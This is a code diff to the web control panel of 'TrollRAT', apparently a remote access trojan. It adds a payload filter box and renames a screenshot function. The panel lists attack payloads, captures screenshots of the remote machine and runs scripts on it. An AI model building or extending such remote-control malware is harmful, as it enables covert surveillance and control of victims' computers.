@@ -21,9 +21,9 @@
 	<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.16.0/mode/clike/clike.min.js"></script>
 
 	<style type="text/css">
-		body {
-			padding-top: 70px;
-		}
+		body { padding-top: 70px; }
+		#filter { margin-bottom: 6px; }
+		.hidden { display: none }
 	</style>
 
 	<title>TrollRAT</title>
@@ -43,7 +43,7 @@
 
 			<div class="collapse navbar-collapse" id="navbar">
 				<div class="navbar-right">
-					<button class="btn btn-default navbar-btn" onclick="screenshot();">Screenshot</button>
+					<button class="btn btn-default navbar-btn" onclick="showScreenshot();">Screenshot</button>
 					<button class="btn btn-default navbar-btn" onclick="showEditor();">Run Script</button>
 				</div>
 			</div>
@@ -58,6 +58,7 @@
 		<div class="row">
 			<div class="col-md-4">
 				<h3>Payloads</h3>
+				<input type="text" class="form-control" id="filter" oninput="updateFilter();" placeholder="Filter Payloads" />
 				<div class="list-group" id="payloads"></div>
 			</div>
 
@@ -110,7 +111,7 @@
 						<img id="screenshot" style="width: 100%;" src="/screenshot.png" />
 					</div>
 					<div class="modal-footer">
-						<button type="button" class="btn btn-primary" onclick="screenshot();"><span class="glyphicon glyphicon-refresh" aria-hidden="true"></span> Refresh</button>
+						<button type="button" class="btn btn-primary" onclick="showScreenshot();"><span class="glyphicon glyphicon-refresh" aria-hidden="true"></span> Refresh</button>
 					</div>
 				</div>
 			</div>
@@ -192,6 +193,7 @@
 			}).done(function (payloads) {
 				if (payloads != oldpayloads) {
 					$("#payloads").html(payloads);
+					updateFilter();
 
 					if (active != -1)
 						$("#payloads").children().eq(active).addClass("active");
@@ -200,6 +202,16 @@
 				}
 			}).error(function () {
 				showError("Server communication failed!");
+			});
+		}
+
+		function updateFilter() {
+			$("#payloads .list-group-item").each(function() {
+				if ($(this).html().toLowerCase().indexOf($("#filter").val().toLowerCase()) == -1) {
+					$(this).addClass("hidden");
+				} else {
+					$(this).removeClass("hidden");
+				}
 			});
 		}
 
@@ -215,11 +227,12 @@
 			});
 		}
 
-		function screenshot() {
-			$("#screenshot").attr("src", "/screenshot?" + new Date().getTime());
-			$("#screenshot").load(function () {
+		function showScreenshot() {
+			$("#screenshot").attr("src", "/screenshot?t=" + new Date().getTime());
+
+			$("#screenshot")[0].onload = function() {
 				$("#screenshotModal").modal();
-			});
+			};
 		}
 
 		function execute(id) {
